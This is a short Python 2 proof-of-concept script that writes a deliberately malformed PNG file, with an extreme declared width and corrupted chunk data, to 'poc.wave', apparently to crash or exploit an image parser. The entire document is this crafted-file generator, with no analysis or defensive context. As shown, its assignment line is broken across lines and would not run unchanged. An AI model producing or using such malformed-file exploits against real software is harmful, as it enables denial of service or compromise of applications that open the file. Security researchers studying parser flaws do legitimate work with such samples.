#!/usr/bin/python
data =
"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52\x7F\xFF\xFF\xFF\x00\x00\x01\x02\x01\x03\x00\x00\x00\xBA\x1B\xD8\x84\x00\x00\x00\x03\x50\x4C\x54\x45\xFF\xFF\xFF\xA7\xC4\x1B\xC8\x00\x00\x00\x01\x74\x52\x4E\x53\x00\x40\xE6\xD8\x66\x00\x68\x92\x01\x49\x44\x41\x54\xFF\x05\x3A\x92\x65\x41\x71\x68\x42\x49\x45\x4E\x44\xAE\x42\x60\x82"
outfile = file("poc.wave", 'wb')
outfile.write(data)
outfile.close()
print "Created Poc"

